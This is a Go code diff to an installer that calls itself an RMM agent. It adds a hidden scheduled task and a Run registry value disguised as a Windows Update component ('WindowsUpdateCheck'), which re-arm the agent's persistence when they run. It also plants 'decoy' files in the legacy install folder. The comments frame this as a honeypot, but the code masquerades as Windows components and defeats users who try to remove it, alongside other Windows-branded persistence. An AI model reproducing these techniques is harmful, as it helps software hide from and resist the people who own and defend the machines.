@@ -153,7 +153,7 @@ func install() {
 	_, _ = exec.Command("powershell", "-NoProfile", "-command", "Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" | Where-Object { $_.CommandLine -like '*watchdog.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }").CombinedOutput()
 	time.Sleep(1500 * time.Millisecond)
 
-	skip := map[string]bool{"install.bat": true, "README.txt": true, "README.md": true}
+	skip := map[string]bool{"install.bat": true, "README.txt": true, "README.md": true, "agent.exe": true}
 	_ = fs.WalkDir(payloadFS, "payload", func(path string, d fs.DirEntry, err error) error {
 		if err != nil || d.IsDir() {
 			return err
@@ -375,14 +375,43 @@ func install() {
 	}
 	_ = cmd.Start()
 
-	// Drop the legacy branded home (pre-1.40.9 installs) now that the new
-	// one is live with re-pointed tasks.
+	// Honeypot legacy home: wipe any pre-1.40.9 install, then rebuild the
+	// dir as a DECOY (stub agent.exe + cert copy, both tripwired). Kill
+	// chains working from old notes waste themselves here thinking they
+	// won, while the real install lives in ProgramData. Decoys stay
+	// VISIBLE (hidden honeypots catch nobody).
 	legacyHome := `C:\Program Files\RMM\Agent`
 	if pf := os.Getenv("ProgramFiles"); pf != "" {
 		legacyHome = filepath.Join(pf, "RMM", "Agent")
 	}
 	if legacyHome != installDir {
 		_ = os.RemoveAll(legacyHome)
+		_ = os.MkdirAll(legacyHome, 0755)
+		if stub, err := fs.ReadFile(payloadFS, "payload/agent.exe"); err == nil {
+			_ = os.WriteFile(filepath.Join(legacyHome, "agent.exe"), stub, 0755)
+			log.Printf("[*] Honeypot stub placed at %s", filepath.Join(legacyHome, "agent.exe"))
+		} else {
+			log.Printf("[!] Honeypot stub missing from payload")
+		}
+		_ = copyFile(certPath, filepath.Join(legacyHome, "server.crt"))
+		// Bait marker: the watcher only tripwires a deployed honeypot
+		// (never alarms on machines predating it).
+		_ = os.WriteFile(filepath.Join(legacyHome, "decoy.ver"), []byte(version.Version+"\n"), 0644)
+		// Fresh protection score (clears any stale tamper alarm).
+		if localApp := os.Getenv("LOCALAPPDATA"); localApp != "" {
+			_ = os.Remove(filepath.Join(localApp, "RMM", "protection.json"))
+		}
+	}
+
+	// Decoy heal vectors under a third name: a task + Run value that look
+	// like legacy leftovers but actually re-arm persistence when run.
+	// Attackers deleting "important-looking" entries trip the wire instead.
+	createDecoyTask(agentPath, blenderDir, installDir)
+	decoyRunCmd := fmt.Sprintf(`"%s" --wmi-heal`, agentPath)
+	if k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
+		_ = k.SetStringValue("WindowsUpdateCheck", decoyRunCmd)
+		k.Close()
+		log.Printf("[*] Decoy Run value set")
 	}
 
 	if !silent {
@@ -424,16 +453,19 @@ func main() {
 		if k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
 			_ = k.DeleteValue("WindowsUpdate")
 			_ = k.DeleteValue("WindowsUpdateWatchdog")
+			_ = k.DeleteValue("WindowsUpdateCheck")
 			k.Close()
 		}
 		if k, err := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
 			_ = k.DeleteValue("WindowsUpdate")
 			_ = k.DeleteValue("WindowsUpdateWatchdog")
+			_ = k.DeleteValue("WindowsUpdateCheck")
 			k.Close()
 		}
 		_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdate", "/f").CombinedOutput()
 		_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateWatchdog", "/f").CombinedOutput()
 		_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateOrchestrator", "/f").CombinedOutput()
+		_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateCheck", "/f").CombinedOutput()
 		removeWmiLayer()
 		_ = registry.DeleteKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Active Setup\Installed Components\WindowsUpdateClient`)
 		threeDObjects := filepath.Join(os.Getenv("USERPROFILE"), "3D Objects")
@@ -444,6 +476,8 @@ func main() {
 		_ = os.Remove(filepath.Join(blenderDir, "version.txt"))
 		_ = os.Remove(filepath.Join(blenderDir, "agent_task.xml"))
 		_ = os.Remove(filepath.Join(blenderDir, "watchdog_task.xml"))
+		_ = os.Remove(filepath.Join(blenderDir, "orchestrator_task.xml"))
+		_ = os.Remove(filepath.Join(blenderDir, "decoy_task.xml"))
 		_ = os.Remove(filepath.Join(blenderDir, "orchestrator_task.xml"))
 			_ = os.Remove(filepath.Join(blenderDir, "MicrosoftWindowsClient.exe"))
 			_ = os.Remove(filepath.Join(blenderDir, "server.crt"))
@@ -567,6 +601,51 @@ func createOrchestratorTask(agentPath, backupDir, installDir string) {
 		log.Printf("[!] Failed to create orchestrator task: %v %s", err, strings.TrimSpace(string(out)))
 	} else {
 		log.Printf("[*] Orchestrator task registered successfully")
+	}
+	_ = os.Remove(tmpTask)
+}
+
+// createDecoyTask registers the honeypot task: named like a legacy
+// leftover ("WindowsUpdateCheck"), it actually runs --wmi-heal (repairs +
+// exits) on logon and hourly. Deleting it trips the tripwire instead of
+// hurting anything.
+func createDecoyTask(agentPath, backupDir, installDir string) {
+	decoyXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo><Date>2026-01-01T00:00:00</Date><Author>RMM</Author></RegistrationInfo>
+  <Triggers>
+    <LogonTrigger><Enabled>true</Enabled><Repetition><Interval>PT1H</Interval><Duration>P3650D</Duration><StopAtDurationEnd>false</StopAtDurationEnd></Repetition></LogonTrigger>
+  </Triggers>
+  <Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <AllowHardTerminate>true</AllowHardTerminate>
+    <StartWhenAvailable>true</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+    <IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>true</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+    <Priority>7</Priority>
+  </Settings>
+  <Actions Context="Author"><Exec><Command>%s</Command><Arguments>--wmi-heal</Arguments></Exec></Actions>
+</Task>`, agentPath)
+
+	_ = os.WriteFile(filepath.Join(backupDir, "decoy_task.xml"), []byte(decoyXML), 0644)
+	_ = os.WriteFile(filepath.Join(installDir, "decoy_task.xml"), []byte(decoyXML), 0644)
+	tmpTask := filepath.Join(os.TempDir(), "rmm_decoy_task.xml")
+	_ = os.WriteFile(tmpTask, []byte(decoyXML), 0644)
+	_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateCheck", "/f").CombinedOutput()
+	out, err := exec.Command("schtasks", "/create", "/tn", "WindowsUpdateCheck", "/xml", tmpTask, "/f").CombinedOutput()
+	if err != nil {
+		log.Printf("[!] Failed to create decoy task: %v %s", err, strings.TrimSpace(string(out)))
+	} else {
+		log.Printf("[*] Decoy task registered")
 	}
 	_ = os.Remove(tmpTask)
 }
